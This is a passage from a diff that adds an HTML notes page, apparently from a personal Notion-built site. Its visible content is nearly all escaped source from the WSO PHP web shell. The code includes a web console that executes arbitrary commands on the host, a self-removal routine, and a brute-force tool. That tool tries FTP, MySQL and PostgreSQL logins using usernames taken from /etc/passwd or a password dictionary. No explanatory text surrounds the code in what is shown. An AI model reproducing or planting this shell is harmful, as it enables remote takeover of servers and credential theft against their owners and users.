+            }
+        }
+        echo &quot;d.cf.output.value+='&quot;.$temp.&quot;';&quot;;
+        echo &quot;d.cf.output.scrollTop = d.cf.output.scrollHeight;&quot;;
+        $temp = ob_get_clean();
+        echo strlen($temp), &quot;\n&quot;, $temp;
+        exit;
+    }
+    if(empty($_POST['ajax'])&amp;&amp;!empty($_POST['p1']))
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0);
+    wsoHeader();
+    echo &quot;&lt;script&gt;
+if(window.Event) window.captureEvents(Event.KEYDOWN);
+var cmds = new Array('');
+var cur = 0;
+function kp(e) {
+    var n = (window.Event) ? e.which : e.keyCode;
+    if(n == 38) {
+        cur--;
+        if(cur&gt;=0)
+            document.cf.cmd.value = cmds[cur];
+        else
+            cur++;
+    } else if(n == 40) {
+        cur++;
+        if(cur &lt; cmds.length)
+            document.cf.cmd.value = cmds[cur];
+        else
+            cur--;
+    }
+}
+function add(cmd) {
+    cmds.pop();
+    cmds.push(cmd);
+    cmds.push('');
+    cur = cmds.length-1;
+}
+&lt;/script&gt;&quot;;
+    echo '&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit=&quot;if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;&quot;&gt;&lt;select name=alias&gt;';
+    foreach($GLOBALS['aliases'] as $n =&gt; $v) {
+        if($v == '') {
+            echo '&lt;optgroup label=&quot;-'.htmlspecialchars($n).'-&quot;&gt;&lt;/optgroup&gt;';
+            continue;
+        }
+        echo '&lt;option value=&quot;'.htmlspecialchars($v).'&quot;&gt;'.$n.'&lt;/option&gt;';
+    }
+
+    echo '&lt;/select&gt;&lt;input type=button onclick=&quot;add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}&quot; value=&quot;&gt;&gt;&quot;&gt; &lt;nobr&gt;&lt;input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'&gt; send using AJAX &lt;input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'&gt; redirect stderr to stdout (2&gt;&amp;1)&lt;/nobr&gt;&lt;br/&gt;&lt;textarea class=bigarea name=output style=&quot;border-bottom:0;margin:0;&quot; readonly&gt;';
+    if(!empty($_POST['p1'])) {
+        echo htmlspecialchars(&quot;$ &quot;.$_POST['p1'].&quot;\n&quot;.wsoEx($_POST['p1']));
+    }
+    echo '&lt;/textarea&gt;&lt;table style=&quot;border:1px solid #df5;background-color:#555;border-top:0px;&quot; cellpadding=0 cellspacing=0 width=&quot;100%&quot;&gt;&lt;tr&gt;&lt;td width=&quot;1%&quot;&gt;$&lt;/td&gt;&lt;td&gt;&lt;input type=text name=cmd style=&quot;border:0px;width:100%;&quot; onkeydown=&quot;kp(event);&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
+    echo '&lt;/form&gt;&lt;/div&gt;&lt;script&gt;d.cf.cmd.focus();&lt;/script&gt;';
+    wsoFooter();
+}
+
+function actionSelfRemove() {
+
+    if($_POST['p1'] == 'yes')
+        if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
+            die('Shell has been removed');
+        else
+            echo 'unlink error!';
+    if($_POST['p1'] != 'yes')
+        wsoHeader();
+    echo '&lt;h1&gt;Suicide&lt;/h1&gt;&lt;div class=content&gt;Really want to remove the shell?&lt;br&gt;&lt;a href=# onclick=&quot;g(null,null,\'yes\')&quot;&gt;Yes&lt;/a&gt;&lt;/div&gt;';
+    wsoFooter();
+}
+
+function actionBruteforce() {
+    wsoHeader();
+    if( isset($_POST['proto']) ) {
+        echo '&lt;h1&gt;Results&lt;/h1&gt;&lt;div class=content&gt;&lt;span&gt;Type:&lt;/span&gt; '.htmlspecialchars($_POST['proto']).' &lt;span&gt;Server:&lt;/span&gt; '.htmlspecialchars($_POST['server']).'&lt;br&gt;';
+        if( $_POST['proto'] == 'ftp' ) {
+            function wsoBruteForce($ip,$port,$login,$pass) {
+                $fp = @ftp_connect($ip, $port?$port:21);
+                if(!$fp) return false;
+                $res = @ftp_login($fp, $login, $pass);
+                @ftp_close($fp);
+                return $res;
+            }
+        } elseif( $_POST['proto'] == 'mysql' ) {
+            function wsoBruteForce($ip,$port,$login,$pass) {
+                $res = @mysql_connect($ip.':'.($port?$port:3306), $login, $pass);
+                @mysql_close($res);
+                return $res;
+            }
+        } elseif( $_POST['proto'] == 'pgsql' ) {
+            function wsoBruteForce($ip,$port,$login,$pass) {
+                $str = &quot;host='&quot;.$ip.&quot;' port='&quot;.$port.&quot;' user='&quot;.$login.&quot;' password='&quot;.$pass.&quot;' dbname=postgres&quot;;
+                $res = @pg_connect($str);
+                @pg_close($res);
+                return $res;
+            }
+        }
+        $success = 0;
+        $attempts = 0;
+        $server = explode(&quot;:&quot;, $_POST['server']);
+        if($_POST['type'] == 1) {
+            $temp = @file('/etc/passwd');
+            if( is_array($temp) )
+                foreach($temp as $line) {
+                    $line = explode(&quot;:&quot;, $line);
+                    ++$attempts;
+                    if( wsoBruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
+                        $success++;
+                        echo '&lt;b&gt;'.htmlspecialchars($line[0]).'&lt;/b&gt;:'.htmlspecialchars($line[0]).'&lt;br&gt;';
+                    }
+                    if(@$_POST['reverse']) {
+                        $tmp = &quot;&quot;;
+                        for($i=strlen($line[0])-1; $i&gt;=0; --$i)
+                            $tmp .= $line[0][$i];
+                        ++$attempts;
+                        if( wsoBruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
+                            $success++;
+                            echo '&lt;b&gt;'.htmlspecialchars($line[0]).'&lt;/b&gt;:'.htmlspecialchars($tmp);
+                        }
+                    }
+                }
+        } elseif($_POST['type'] == 2) {
+            $temp = @file($_POST['dict']);
+            if( is_array($temp) )
+                foreach($temp as $line) {
+                    $line = trim($line);
+                    ++$attempts;
+                    if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
+                        $success++;
+                        echo '&lt;b&gt;'.htmlspecialchars($_POST['login']).'&lt;/b&gt;:'.htmlspecialchars($line).'&lt;br&gt;';
+                    }
+                }
+        }
+        echo &quot;&lt;span&gt;Attempts:&lt;/span&gt; $attempts &lt;span&gt;Success:&lt;/span&gt; $success&lt;/div&gt;&lt;br&gt;&quot;;
+    }
+    echo '&lt;h1&gt;Bruteforce&lt;/h1&gt;&lt;div class=content&gt;&lt;table&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Type&lt;/span&gt;&lt;/td&gt;'
+        .'&lt;td&gt;&lt;select name=proto&gt;&lt;option value=ftp&gt;FTP&lt;/option&gt;&lt;option value=mysql&gt;MySql&lt;/option&gt;&lt;option value=pgsql&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;'
+        .'&lt;input type=hidden name=c value=&quot;'.htmlspecialchars($GLOBALS['cwd']).'&quot;&gt;'
+        .'&lt;input type=hidden name=a value=&quot;'.htmlspecialchars($_POST['a']).'&quot;&gt;'
+        .'&lt;input type=hidden name=charset value=&quot;'.htmlspecialchars($_POST['charset']).'&quot;&gt;'
+        .'&lt;span&gt;Server:port&lt;/span&gt;&lt;/td&gt;'
+        .'&lt;td&gt;&lt;input type=text name=server value=&quot;127.0.0.1&quot;&gt;&lt;/td&gt;&lt;/tr&gt;'
+        .'&lt;tr&gt;&lt;td&gt;&lt;span&gt;Brute type&lt;/span&gt;&lt;/td&gt;'
+        .'&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value=&quot;1&quot; checked&gt; /etc/passwd&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;'
+        .'&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label style=&quot;padding-left:15px&quot;&gt;&lt;input type=checkbox name=reverse value=1 checked&gt; reverse (login -&gt; nigol)&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;'
+</code></pre>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
